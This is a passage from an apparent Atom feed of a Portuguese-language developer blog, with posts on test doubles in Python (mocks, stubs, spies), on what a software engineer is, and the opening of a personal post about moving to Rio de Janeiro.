        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;descricao&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;descricao&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fabricante&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fabricante&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__str__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;{0} ({1})&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;descricao&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fabricante&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_descricao&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;
        &lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# Teste&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;mock&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;MagicMock&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;test_usando_spy&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;fabricante&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MagicMock&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;fabricante&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_descricao&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;return_value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Volkswagen&amp;#39;&lt;/span&gt;

    &lt;span class="n"&gt;fusca&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Carro&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Fusca&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fabricante&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;gol&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Carro&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Gol&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fabricante&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fusca&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gol&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;assert&lt;/span&gt; &lt;span class="n"&gt;fabricante&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_descricao&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;call_count&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Costumo usar &lt;em&gt;Spies&lt;/em&gt; com frequência em testes &lt;em&gt;front-end&lt;/em&gt;,
principalmente utilizando &lt;a href="https://qunitjs.com/" title="Conheça a suíte de testes JS, QUnit"&gt;&lt;em&gt;QUnit&lt;/em&gt;&lt;/a&gt; e &lt;a href="http://sinonjs.org/" title="Spies, stubs and mocks for Javascript"&gt;&lt;em&gt;Sinon.JS&lt;/em&gt;&lt;/a&gt;,
para garantir a chamada de um determinado método dentro de eventos complexos,
onde não consigo ter certeza sobre o resultado esperado.&lt;/p&gt;
&lt;h2&gt;Conclusão&lt;/h2&gt;
&lt;p&gt;Já dizia o filósofo que "mockar é uma arte". A verdade é que o uso de &lt;em&gt;doubles&lt;/em&gt;
nos ajuda muito quando estamos trabalhando dentro de um contexto de &lt;em&gt;TDD&lt;/em&gt;,
simplificando assim um relacionamento complexo entre classes/objetos, afim de
agilizar o nosso desenvolvimento e facilitar os nosso testes.&lt;/p&gt;
&lt;p&gt;Recentemente participei de um treinamento da &lt;a href="http://www.industriallogic.com/" title="Developing Software Doesn't Have To Be Slow, Stressful And Filled With Unpleasant Surprises"&gt;&lt;em&gt;Industrial Logic&lt;/em&gt;&lt;/a&gt;, sobre &lt;em&gt;Refactoring&lt;/em&gt;, e a lição que ficou foi:
Use &lt;em&gt;mocks&lt;/em&gt; moderadamente. Sempre dê preferência a uma alteração na arquitetura
do seu &lt;em&gt;software&lt;/em&gt; (como por exemplo, o uso de &lt;a href="https://pt.wikipedia.org/wiki/Inje%C3%A7%C3%A3o_de_depend%C3%AAncia" title="Leia mais no Wikipedia"&gt;Injeção de Dependência&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;Se o uso de dublês for inevitável, prefira tipos mais simples
(&lt;em&gt;Dummys&lt;/em&gt; e &lt;em&gt;Fakes&lt;/em&gt;). Dessa forma, os seus testes ficarão simples, legíveis e
mais fáceis de manter.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;&lt;a href="https://nirajrules.wordpress.com/2011/08/27/dummy-vs-stub-vs-spy-vs-fake-vs-mock/" title="Leia o artigo completo sobre as nomenclaturas"&gt;Niraj Bhatt - Dummy vs. Stub vs. Spy vs. Fake vs. Mock&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;a href="http://stackoverflow.com/questions/346372/whats-the-difference-between-faking-mocking-and-stubbing" title="Leia mais no StackOverflow"&gt;StackOverflow - What's the difference between faking, mocking, and stubbing?&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;a href="http://code.tutsplus.com/articles/tdd-terminology-simplified--net-30626" title="Leia mais sobre TDD no Tuts+"&gt;Tuts+ - TDD Terminology Simplified&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="testes"></category><category term="mock"></category><category term="python"></category></entry><entry><title>O que é um Software Engineer?</title><link href="https://klauslaube.com.br/2015/03/29/o-que-e-um-software-engineer.html" rel="alternate"></link><published>2015-03-29T22:10:00-03:00</published><updated>2015-03-29T22:10:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2015-03-29:/2015/03/29/o-que-e-um-software-engineer.html</id><summary type="html">&lt;p&gt;Certa vez, estava eu atualizando o meu &lt;em&gt;LinkedIn&lt;/em&gt; quando o
&lt;a href="https://twitter.com/davidsonfellipe" title="Acompanhe o Davi do Som no Twitter"&gt;@davidsonfellipe&lt;/a&gt; me indagou sobre o título de "Analista e Desenvolvedor Web" que possuo atualmente. Segundo ele, "Front-end/Back-end Engineer" é mais atrativo para que &lt;em&gt;headhunters&lt;/em&gt; cheguem a um perfil.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Contra argumentei dizendo que essa não era a minha formação, e …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Certa vez, estava eu atualizando o meu &lt;em&gt;LinkedIn&lt;/em&gt; quando o
&lt;a href="https://twitter.com/davidsonfellipe" title="Acompanhe o Davi do Som no Twitter"&gt;@davidsonfellipe&lt;/a&gt; me indagou sobre o título de "Analista e Desenvolvedor Web" que possuo atualmente. Segundo ele, "Front-end/Back-end Engineer" é mais atrativo para que &lt;em&gt;headhunters&lt;/em&gt; cheguem a um perfil.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Contra argumentei dizendo que essa não era a minha formação, e que não me
sentia confortável em me chamar de engenheiro. Ele, hoje um &lt;em&gt;Front-end Engineer&lt;/em&gt;
com formação em Engenharia da Computação, afirmou que isso era bobagem, e que
eu já praticava muitas das suas atribuições no dia a dia.&lt;/p&gt;
&lt;p&gt;A partir daí comecei a me perguntar: O que raios é e o que faz um Engenheiro
de Software?&lt;/p&gt;
&lt;h2&gt;Engenharia?&lt;/h2&gt;
&lt;p&gt;Segundo o &lt;em&gt;Wikipedia&lt;/em&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;A engenharia é a ciência, a arte e a profissão de adquirir e de aplicar os
conhecimentos matemáticos, técnicos e científicos na criação,
aperfeiçoamento e implementação de utilidades, tais como materiais,
estruturas, máquinas, aparelhos, sistemas ou processos, que realizem uma
determinada função ou objetivo.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Um engenheiro é basicamente o profissional que aplica esse conhecimento para
desenvolver soluções para problemas técnicos. Em determinadas áreas de
atuação, ele deve estar certificado/licenciado para que possa utilizar esse
título.&lt;/p&gt;
&lt;p&gt;É importante notar que um engenheiro transita entre diversas áreas de
conhecimento dentro de uma determinada profissão. Um Engenheiro Civil,
por exemplo, além de gerenciar e executar as obras, também é responsável
por fazer análise de solo, ventilação, das instalações elétricas, do
saneamento, dos custos, dos padrões de qualidade, da segurança, do prazo, etc.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/what-my-friends-think-I-do-what-i-actually-do-engineer.jpg" width="620" height="492" title="O que meus amigos acham que eu faço (whatmyfriendsthinkido.net)" alt="O que meus amigos acham que eu faço (whatmyfriendsthinkido.net)"&gt;&lt;/p&gt;
&lt;p&gt;Na TI, como &lt;a href="http://www.profissionaisti.com.br/2013/06/14-motivos-para-voce-ser-contra-a-regulamentacao-dos-profissionais-de-ti/" title="14 motivos para você ser contra a regulamentação dos profissionais de TI"&gt;não há regulamentação da profissão&lt;/a&gt;,
é muito comum vermos desenvolvedores "abraçarem" diferentes atribuições dentro
de um projeto, e por fim, acabarem exercendo esse papel multidisciplinar.&lt;/p&gt;
&lt;h2&gt;A Engenharia de Software&lt;/h2&gt;
&lt;p&gt;O termo "Engenharia de Software", surgiu na década de 60, com a intenção de
contornar a &lt;a href="http://pt.wikipedia.org/wiki/Crise_do_software" title="Leia mais no Wikipedia"&gt;crise do Software&lt;/a&gt;,
e dar um tratamento mais sistemático e controlado ao desenvolvimento de
sistemas complexos.&lt;/p&gt;
&lt;p&gt;Segundo &lt;em&gt;&lt;a href="http://en.wikipedia.org/wiki/Friedrich_L._Bauer" title="Leia mais sobre Bauer no Wikipedia"&gt;Friedrich L. Bauer&lt;/a&gt;&lt;/em&gt;,
autor do que viria a ser a primeira definição sobre Engenharia de Software:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(...) é a criação e a utilização de sólidos princípios de engenharia a fim
de obter software de maneira econômica, que seja confiável e que trabalhe
eficientemente em máquinas reais.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Enquanto um cientista da computação estará "focado" com o desenvolvimento de
modelos matemáticos, algoritmos, e a aplicabilidade de sua lógica dentro de um
contexto específico, o engenheiro, além de estar envolvido com o desenvolvimento
do sistema, terá atenção ao processo, à eficiência, aos recursos e até mesmo
aos custos.&lt;/p&gt;
&lt;h2&gt;Em outras palavras: Não basta só programar&lt;/h2&gt;
&lt;p&gt;O &lt;a href="http://twitter.com/romulojales" title="Siga o Jales no Twitter"&gt;@romulojales&lt;/a&gt; me
apresentou um ponto de vista super interessante sobre o assunto:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Se eu recebo algo para fazer e simplesmente faço, eu sou apenas um
desenvolvedor. Agora, se eu recebo algo para fazer, e questiono, eu sou
um engenheiro.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Determinar quais são as responsabilidades de um Engenheiro de Software nem
sempre é uma tarefa fácil. O &lt;a href="http://twitter.com/mittmann" title="Siga o Cleiton no Twitter"&gt;@mittmann&lt;/a&gt;
apresentou o seu ponto de vista sobre a questão:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Já que a engenharia abrange muita coisa. O engenheiro é um cientista aplicado.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;O &lt;em&gt;Facebook&lt;/em&gt;, por exemplo, detalha de forma bem sofisticada o que ele espera de
um profissional com este título:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Create elegant and useful solutions to solve complex business problems by working across various teams, understanding the needs of our business partners and advertisers, and putting on your product manager hat to provide solutions to solve those problems.&lt;/li&gt;
&lt;li&gt;Work closely with product management and UX design teams to define and refine feature specifications.&lt;/li&gt;
&lt;li&gt;Design and develop front-end interfaces, underlying APIs, and backend systems across a number of programming languages with focus on JavaScript, React and PHP (Hack).&lt;/li&gt;
&lt;li&gt;Analyze and improve the efficiency, scalability, stability, and security of business applications and in-house systems to help scale the company.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Note a ênfase em "eficiência, escalabilidade e estabilidade". É normal vermos
empresas exigindo certa experiência nesses quesitos nos tempos atuais (não me
surpreenderia se os próximos requisitos para o "cargo" envolvessem &lt;em&gt;big data&lt;/em&gt;
e "containerização").&lt;/p&gt;
&lt;p&gt;Transitar entre as diferentes esferas do conhecimento (como &lt;em&gt;front-end&lt;/em&gt;,
&lt;em&gt;back-end&lt;/em&gt;, &lt;em&gt;storage&lt;/em&gt;, &lt;em&gt;infra-structure&lt;/em&gt;, &lt;em&gt;business&lt;/em&gt;, &lt;em&gt;project management&lt;/em&gt;)
é outra característica marcante desses profissionais.
O &lt;a href="http://pt.wikipedia.org/wiki/Software_Engineering_Body_of_Knowledge" title="Leia mais no Wikipedia"&gt;SWEBOK&lt;/a&gt; (Software Engineering Body of Knowledge)
determina quais áreas de conhecimento fazem parte da Engenharia de Software em
seu guia, que pode ser baixado diretamente do &lt;a href="http://www.computer.org/web/swebok/index" title="Baixe o guia V3 da SWEBOK"&gt;site da Computer Society&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Conclusão&lt;/h2&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/dilbert-google-engineer.png" width="620" height="193" title="Dilbert e os engenheiros do Google (seroundtable.com)" alt="Dilbert e os engenheiros do Google (seroundtable.com)"&gt;&lt;/p&gt;
&lt;p&gt;Intitular-se engenheiro ou não, é algo que vai além do simples "ter aprendido
sobre determinado assunto". Durante a escrita desse artigo, me deparei com
vários questionamentos, envolvendo a graduação, a regulamentação da área,
e até mesmo sobre cargos, papéis e remunerações.&lt;/p&gt;
&lt;p&gt;Na prática, se você é uma pessoa engajada com o projeto, em diferentes esferas,
com foco em sustentabilidade, qualidade, transitando entre a base de dados,
a infraestrutura, a experiência do usuário, e o código em si. Você pode ter
certeza que está desempenhando papéis que cabem a um Engenheiro de Software.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://engenhariasoftware.wordpress.com/2014/07/04/engenharia-de-software-crea-sbc-acm-e-enade/"&gt;Engenharia de Software - Engenharia de Software, CREA, SBC, ACM e ENADE&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/careers/department?dept=grad&amp;amp;req=a0I1200000G4LPgEAN"&gt;Facebook - Software Engineer, Enterprise&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://guiadoestudante.abril.com.br/profissoes/engenharia-producao/engenharia-civil-685209.shtml"&gt;Guia do Estudante - Engenheiro Civil&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://guiadoestudante.abril.com.br/orientacao-vocacional/consulte-orientador/qual-diferenca-ciencia-computacao-engenharia-software-731291.shtml"&gt;Guia do Estudante - Qual a diferença entre Ciência da Computação e Engenharia de Software?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.computer.org/web/swebok/index"&gt;IEEE Computer Society - About SWEBOK&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://pt.wikibooks.org/wiki/Engenharia_de_Software/O_que_%C3%A9_Engenharia_de_Software%3F"&gt;&lt;em&gt;Wikibooks&lt;/em&gt; - O que é Engenharia de Software?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://pt.wikipedia.org/wiki/Engenharia"&gt;&lt;em&gt;Wikipedia&lt;/em&gt; - Engenharia&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://pt.wikipedia.org/wiki/Engenharia_de_software" title="Leia mais sobre no Wikipedia"&gt;&lt;em&gt;Wikipedia&lt;/em&gt; - Engenharia de Software&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Friedrich_L._Bauer"&gt;&lt;em&gt;Wikipedia&lt;/em&gt; - Friedrich L. Bauer&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="profissao"></category><category term="carreira"></category><category term="desenvolvedor"></category><category term="software engineer"></category></entry><entry><title>Os testes e os dublês - Parte 1</title><link href="https://klauslaube.com.br/2014/08/07/os-testes-e-os-dubles-parte-1.html" rel="alternate"></link><published>2014-08-07T23:00:00-03:00</published><updated>2014-08-07T23:00:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2014-08-07:/2014/08/07/os-testes-e-os-dubles-parte-1.html</id><summary type="html">&lt;p&gt;Em tempos onde &lt;a href="http://martinfowler.com/articles/is-tdd-dead/" title="Is TDD dead?"&gt;discussões envolvendo a relevância&lt;/a&gt; dos &lt;a href="https://klauslaube.com.br/tag/testes.html" title="Leia mais sobre testes"&gt;testes&lt;/a&gt; têm
causado furor nos diferentes campos da área do desenvolvimento de &lt;em&gt;software&lt;/em&gt;,
nada mais justo do que "chovermos no molhado", e falarmos sobre testes, &lt;em&gt;mocks&lt;/em&gt;,
&lt;em&gt;stubs&lt;/em&gt; e todos os seus primos menos famosos.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Nessa primeira parte, vamos conceituar toda essa "sopa …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Em tempos onde &lt;a href="http://martinfowler.com/articles/is-tdd-dead/" title="Is TDD dead?"&gt;discussões envolvendo a relevância&lt;/a&gt; dos &lt;a href="https://klauslaube.com.br/tag/testes.html" title="Leia mais sobre testes"&gt;testes&lt;/a&gt; têm
causado furor nos diferentes campos da área do desenvolvimento de &lt;em&gt;software&lt;/em&gt;,
nada mais justo do que "chovermos no molhado", e falarmos sobre testes, &lt;em&gt;mocks&lt;/em&gt;,
&lt;em&gt;stubs&lt;/em&gt; e todos os seus primos menos famosos.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Nessa primeira parte, vamos conceituar toda essa "sopa de letrinhas" e detalhar
a forma peculiar como os testes são tratados dentro de um dos times
da &lt;a href="http://globo.com" title="Absolutamente tudo sobre notícias, esportes e entretenimento"&gt;&lt;em&gt;Globo.com&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Qual causa, motivo, razão ou circunstância?&lt;/h2&gt;
&lt;p&gt;Eu gosto muito da linha de pensamento que colegas como &lt;em&gt;&lt;a href="http://twitter.com/rafael_mws" title="Siga o Cabra no Twitter"&gt;Rafael Martins&lt;/a&gt;&lt;/em&gt; e
&lt;em&gt;&lt;a href="https://twitter.com/romulojales" title="Siga o Rômulo"&gt;Rômulo Jales&lt;/a&gt;&lt;/em&gt;, têm em relação a testes automatizados: Pare de perder tempo
separando-os em unitários, funcionais, aceitação ou regressão, e vá escrevê-los.&lt;/p&gt;
&lt;p&gt;Particularmente, acho vantajoso praticar o &lt;a href="https://klauslaube.com.br/tag/tdd.html" title="Leia mais sobre TDD"&gt;&lt;em&gt;TDD&lt;/em&gt;&lt;/a&gt;, deixando com que os
testes me ajudem a montar a arquitetura da aplicação. Quando roubamos um pouco
da filosofia do parágrafo anterior, temos um foco maior na resolução de um
requisito do que na "minúcia" de uma classe/módulo/pacote. Organicamente
conseguimos atingir um desenvolvimento focado no funcional, muito próximo de
propostas como a do &lt;a href="https://klauslaube.com.br/tag/bdd.html" title="Leia mais sobre BDD"&gt;&lt;em&gt;BDD&lt;/em&gt;&lt;/a&gt;, sem precisar recorrer a artifícios
como &lt;em&gt;user stories&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Ok... deixamos de ser tão "unitários", e aprendemos a lidar com o todo. Mas e
os acessos ao banco de dados? Ao &lt;em&gt;&lt;a href="https://klauslaube.com.br/tag/memcached.html" title="Leia mais sobre Memcached"&gt;Memcached&lt;/a&gt;&lt;/em&gt; ou &lt;em&gt;Redis&lt;/em&gt;? E as interações
entre meus serviços e &lt;em&gt;APIs&lt;/em&gt; internas? E as escritas em disco? E as sessões
do usuário?&lt;/p&gt;
&lt;p&gt;Como lidar com tudo isso?&lt;/p&gt;
&lt;h2&gt;O Case de Esportes 1&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;Esportes 1&lt;/em&gt; é um dos 3 times que compõe o núcleo de desenvolvimento da área
de esportes, da &lt;em&gt;Globo.com&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;No time, decidimos que a maioria dessas interações deve estar lá em tempo de
execução dos testes. Ou seja, (&lt;a href="https://docs.djangoproject.com/en/dev/topics/testing/tools/" title="Testing Tools"&gt;com uma ajudinha do &lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;) nossos testes
consultam o banco de dados, interagem com a camada de cache, escrevem em
disco, etc.&lt;/p&gt;
&lt;p&gt;Somos tão preguiçosos que os testes chegam a consultar os ambientes de
teste/desenvolvimento dos serviços criados por outros times, como dados
semânticos, de dados esportivos, de vídeos, etc.&lt;/p&gt;
&lt;p&gt;Obviamente temos o &lt;em&gt;trade-off&lt;/em&gt; dos tempos de execução, que até o momento não
chegaram a ser um problema tão grande para a equipe.&lt;/p&gt;
&lt;h3&gt;Um lugar escuro e frio&lt;/h3&gt;
&lt;p&gt;Concluímos que nossos testes não são nem de longe isolados. Estamos mais
preocupados em validar o comportamento de uma funcionalidade do que de um
objeto em específico.&lt;/p&gt;
&lt;p&gt;Batemos no peito, orgulhosos de nossa decisão, e começamos a encarar o mundo
com olhos marejados pelo árduo caminho que percorremos para chegar até aqui.&lt;/p&gt;
&lt;p&gt;Mas existe a "borda" da aplicação. Dali para fora, você não tem controle algum
sobre o que acontece. Você apenas tem a promessa de que aquela &lt;em&gt;API&lt;/em&gt; vai
funcionar. Deixar com que os testes batam nesses serviços "estrangeiros" pode
custar muito tempo (e claro, dinheiro), tornando inviável a execução dos mesmos
em tempo de desenvolvimento.&lt;/p&gt;
&lt;p&gt;E é aí meu amigo, depois dessa justificativa gigante, que entram os &lt;em&gt;mocks&lt;/em&gt;,
&lt;em&gt;stubs&lt;/em&gt;, &lt;em&gt;spies&lt;/em&gt;, etc.&lt;/p&gt;
&lt;h2&gt;Don't mock me!&lt;/h2&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/dubles.jpg" width="612" height="400" title="Entram os dublês!" alt="Entram os dublês!"&gt;&lt;/p&gt;
&lt;p&gt;Vamos abrir um parênteses aqui para esclarecer o conceito de "mock".
Na &lt;a href="http://www.voidspace.org.uk/python/mock/#terminology" title="Biblioteca de mock do Python"&gt;documentação da biblioteca de &lt;em&gt;mock&lt;/em&gt; do &lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;, temos a seguinte
(e incrivelmente sucinta) definição:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;A “mock object” is an object used to replace a real one in a system under test.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Ou, &lt;a href="http://www.infoq.com/br/articles/mocks-Arent-Stubs" title="A diferença entre Mocks e Stubs"&gt;nas palavras de &lt;em&gt;Martin Fowler&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(...) objetos pré-programados com informações que formam uma especificação das chamadas que esperam receber.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;O termo &lt;em&gt;mock&lt;/em&gt; faz parte de um conceito mais genérico, conhecido por
&lt;em&gt;Test Double&lt;/em&gt;. Segundo &lt;em&gt;Fowler&lt;/em&gt;, esse termo é usado para qualquer objeto que
tem por finalidade, em um teste, substituir um objeto real.&lt;/p&gt;
&lt;p&gt;Logo, quando em &lt;em&gt;Esportes1&lt;/em&gt; consumimos um recurso externo, "mentimos" para o
sistema. Além do &lt;strong&gt;Mock&lt;/strong&gt;, existem outros dublês que nos ajudam nessa tarefa:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Dummy:&lt;/strong&gt; Objetos com o propósito apenas de "ocupar espaço", geralmente usados em passagens de parâmetros;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Fake:&lt;/strong&gt; Objetos funcionais, mas inadequados para um ambiente de produção;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Stubs:&lt;/strong&gt; Providenciam respostas pré-configuradas, e normalmente não respondem a nada que não esteja programado para o teste;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Spies:&lt;/strong&gt; Você pega um objeto real, substituindo o comportamento apenas de alguns métodos.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;O &lt;em&gt;InfoQ&lt;/em&gt; possui um artigo do &lt;em&gt;Martin Fowler&lt;/em&gt;, &lt;a href="http://www.infoq.com/br/articles/mocks-Arent-Stubs" title="Mocks não são Stubs"&gt;traduzido para o Português&lt;/a&gt;,
onde ele conceitua bem os diferentes tipos de dublês, principalmente o &lt;em&gt;mock&lt;/em&gt;
e &lt;em&gt;stub&lt;/em&gt;. Vale a leitura.&lt;/p&gt;
&lt;p&gt;Na segunda parte deste &lt;em&gt;post&lt;/em&gt;, utilizaremos cada conceito de forma prática, e
discutiremos um pouco mais sobre o grande dilema: Mockar ou não mockar.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.infoq.com/br/articles/mocks-Arent-Stubs" title="Leia o artigo do Martin Fowler, traduzido para pt-BR"&gt;&lt;em&gt;Info Q&lt;/em&gt; - &lt;em&gt;Mocks&lt;/em&gt; não são &lt;em&gt;Stubs&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.voidspace.org.uk/python/mock/#terminology" title="Leia sobre a terminologia usada pela lib mock"&gt;&lt;em&gt;Mock&lt;/em&gt; - &lt;em&gt;Mocking and Testing Library&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://docs.mockito.googlecode.com/hg/latest/org/mockito/Mockito.html#13" title="Definição de Spies pela Mockito"&gt;&lt;em&gt;Mockito&lt;/em&gt; - &lt;em&gt;Spying on real objects&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="testes"></category><category term="mock"></category><category term="python"></category></entry><entry><title>As lições aprendidas em 3 anos de cidade grande</title><link href="https://klauslaube.com.br/2014/05/05/as-licoes-aprendidas-em-3-anos-de-cidade-grande.html" rel="alternate"></link><published>2014-05-05T22:00:00-03:00</published><updated>2014-05-05T22:00:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2014-05-05:/2014/05/05/as-licoes-aprendidas-em-3-anos-de-cidade-grande.html</id><summary type="html">&lt;p&gt;Neste mês de Maio, faz 3 anos que deixei &lt;em&gt;&lt;a href="http://pt.wikipedia.org/wiki/Schroeder" title="Conheça SC!"&gt;Schroeder (SC)&lt;/a&gt;&lt;/em&gt; e me mudei para
o Rio de Janeiro, para trabalhar na &lt;em&gt;&lt;a href="http://globo.com" title="Uma das maiores empresas de mídia da América Latina"&gt;Globo.com&lt;/a&gt;&lt;/em&gt;. Não tinha como ser
diferente: Eu estava estudando as tecnologias utilizadas pelo "plim-plim" há
quase 1 ano, e idealizava como seria trabalhar para uma das maiores …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Neste mês de Maio, faz 3 anos que deixei &lt;em&gt;&lt;a href="http://pt.wikipedia.org/wiki/Schroeder" title="Conheça SC!"&gt;Schroeder (SC)&lt;/a&gt;&lt;/em&gt; e me mudei para
o Rio de Janeiro, para trabalhar na &lt;em&gt;&lt;a href="http://globo.com" title="Uma das maiores empresas de mídia da América Latina"&gt;Globo.com&lt;/a&gt;&lt;/em&gt;. Não tinha como ser
